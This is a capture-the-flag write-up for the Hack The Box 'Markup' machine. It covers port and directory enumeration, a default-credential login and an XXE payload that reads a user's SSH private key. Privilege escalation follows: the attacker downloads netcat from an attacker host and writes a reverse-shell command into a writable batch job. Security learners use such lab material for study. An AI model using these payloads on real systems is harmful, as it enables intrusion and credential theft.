# Markup

## enumeration

### nmap

```
PORT    STATE SERVICE  REASON  VERSION
22/tcp  open  ssh      syn-ack OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9f:a0:f7:8c:c6:e2:a4:bd:71:87:68:82:3e:5d:b7:9f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDJ6igORqDgM0+6P4dUx3DcDJyuzMMRkDabKsdcrizRtEKleaaYjmgCbwyhD+JqwIX2AZqoC0MLH0q37YJzp3aegjEW9Q0dUBQGSoRRe8wWmsHRFbxgaoGunpB5VK4p3KE2MPVJXUkTSW2Mdrq4yWb63HnNF4TSIPk/+U5e99Qlrgmn0IeJrn9jkRBjPjLq1HSL0zY4YTO5qnvUktZ8J0Y19YVkYfZoLXJeTtiUKEXJYIUog8oUq9M8+1rUHU/GTjdU5X+jNExqvWm15fXr42Of2hnKP8ZRjyynWZ9hPAQjmCHCxh0Mvn/fWCsJ2nri/3SOULiwEfG9XULbLX0tABz++ujmiRyOZoPDscazFzxqfofiJhRm4cxiYf1p2pfjITfWGpxOUxOYDawXT10fLjo7hjpDqy6pKuK3TGbBx5VVG9p1szrctN9XpnI2bmpTMix3ISqddFgTHJimyb5TrcWZ876igSAPx0GtVOZqAk4ae1xh/qutG/PONnVQWcwZQLU=
|   256 90:7d:96:a9:6e:9e:4d:40:94:e7:bb:55:eb:b3:0b:97 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPnBLEC67Ty1ccuPW0DPWevSQAIg39y1jbSVLmegQkZ3vCooq0wheIffYyBhRnAAJj6Fi1jpTxP7u6H8JAqyGjU=
|   256 f9:10:eb:76:d4:6d:4f:3e:17:f3:93:d6:0b:8c:4b:81 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAID9o7yWjLL4g6Gu71UeLZB+kbmzW+cp0eiRtb21D1JZC

80/tcp  open  http     syn-ack Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
|_http-title: MegaShopping
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

443/tcp open  ssl/http syn-ack Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
| tls-alpn: 
|_  http/1.1
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
| SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
|_http-title: MegaShopping
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

```

### ffuf
```
.htaccess               [Status: 403, Size: 1046, Words: 102, Lines: 43]
.hta                    [Status: 403, Size: 1046, Words: 102, Lines: 43]
.htpasswd               [Status: 403, Size: 1046, Words: 102, Lines: 43]
aux                     [Status: 403, Size: 1046, Words: 102, Lines: 43]
cgi-bin/                [Status: 403, Size: 1060, Words: 103, Lines: 43]
com2                    [Status: 403, Size: 1046, Words: 102, Lines: 43]
com1                    [Status: 403, Size: 1046, Words: 102, Lines: 43]
com3                    [Status: 403, Size: 1046, Words: 102, Lines: 43]
con                     [Status: 403, Size: 1046, Words: 102, Lines: 43]
Images                  [Status: 301, Size: 340, Words: 22, Lines: 10]
images                  [Status: 301, Size: 340, Words: 22, Lines: 10]
index.php               [Status: 200, Size: 12100, Words: 5156, Lines: 378]
licenses                [Status: 403, Size: 1205, Words: 127, Lines: 46]
lpt2                    [Status: 403, Size: 1046, Words: 102, Lines: 43]
lpt1                    [Status: 403, Size: 1046, Words: 102, Lines: 43]
nul                     [Status: 403, Size: 1046, Words: 102, Lines: 43]
phpmyadmin              [Status: 403, Size: 1205, Words: 127, Lines: 46]
prn                     [Status: 403, Size: 1046, Words: 102, Lines: 43]
server-status           [Status: 403, Size: 1205, Words: 127, Lines: 46]
server-info             [Status: 403, Size: 1205, Words: 127, Lines: 46]
webalizer               [Status: 403, Size: 1046, Words: 102, Lines: 43]

```


login with `admin : password` (trivial)

check code of `order` page 

```
    <title>Goods & Services</title>
    <!-- Modified by Daniel : UI-Fix-9092-->
    <style>

  ...

    function getXml() {
            var elements = document.forms.myForm.elements;
            var xmlTemplate = '<?xml version = "1.0"?><order>';
            for (var i = 0; i < elements.length; i++) {
                var element = elements[i];
                if (element.tagName == "INPUT") {
                    xmlTemplate = xmlTemplate + '<' + element.name + '>' + element.value + '</' + element.name + '>';
                }

```

as its `XXE vulnerability` fire up burpsuite and add your payload to read files

I got a bit lost here because I am more used to linux machines (/etc/passwd is a classic)

And its a windows machine so...look for windows juicy files? I guess

you can get daniel's ssh key with this payload

```
<?xml version = "1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM 'file:///c:/users/daniel/.ssh/id_rsa'>]>
<order>
	<quantity>1</quantity>
	<item>
&xxe;
</item>
	<address>test</address>
</order>
```

change authorisations on the key (chmod 600 usually) and ssh as daniel

get his flag
```
daniel@MARKUP C:\Users\daniel\Desktop>type user.txt 
this_flag_is_free_to_grab       
```

## privilege escalation

On windows its a bit...different

enumeration is first

```
daniel@MARKUP C:\Users\daniel\Desktop>net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            daniel                   DefaultAccount
Guest                    WDAGUtilityAccount
The command completed with one or more errors.


daniel@MARKUP C:\Users\daniel\Desktop>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

not much...in the files there is a  `Log-Management` folder in C:/

```
 Directory of C:\Log-Management

03/12/2020  02:56 AM    <DIR>          .
03/12/2020  02:56 AM    <DIR>          ..
03/06/2020  01:42 AM               346 job.bat
               1 File(s)            346 bytes
               2 Dir(s)   7,394,123,776 bytes free

daniel@MARKUP C:\Log-Management>type job.bat 
@echo off 
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
echo.
echo Event Logs have been cleared!
goto theEnd
:do_clear
wevtutil.exe cl %1
goto :eof
:noAdmin
echo You must run this script as an Administrator!
:theEnd
exit
```

`wevtutil.exe` seems nice...we check our autorisations on the script

```
daniel@MARKUP C:\Log-Management>icacls job.bat
job.bat BUILTIN\Users:(F)
        NT AUTHORITY\SYSTEM:(I)(F)
        BUILTIN\Administrators:(I)(F)
        BUILTIN\Users:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```
upload netcat on that machine

```
daniel@MARKUP C:\Log-Management>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Log-Management> Invoke-WebRequest "http://10.10.15.58/nc.exe" -OutFile "nc.exe"
PS C:\Log-Management> dir 

    Directory: C:\Log-Management


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/6/2020   1:42 AM            346 job.bat
-a----       12/17/2021   7:50 AM          45272 nc.exe


```

seems like wevtutil runs as a service

```
PS C:\Log-Management> ps 
...
     55       5      956       4244               196   1 wevtutil
     21       4      420       1208               308   1 wevtutil
     55       5      952       4244              2636   1 wevtutil
     55       5      948       4236              2952   1 wevtutil

```
Add a reverse shell to job.bat and prepare a netcat listenner

```

PS C:\Log-Management> exit

daniel@MARKUP C:\Log-Management>echo c:\Log-Management\nc.exe -e cmd.exe 10.10.15.58 2311 > c:\Log-Management\job.bat 
```
Get privileges almost instantly

```
└──╼ $nc -lnvp 2311
listening on [any] 2311 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 49672
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
markup\

...

c:\Users\Administrator\Desktop>type root.txt
type root.txt
you_have_to_pay_for_this_flag

```

Good now you can get into real stuff!

note: hackthebox got no easy boxes...don't be fooled by what they say! 

be prepared!
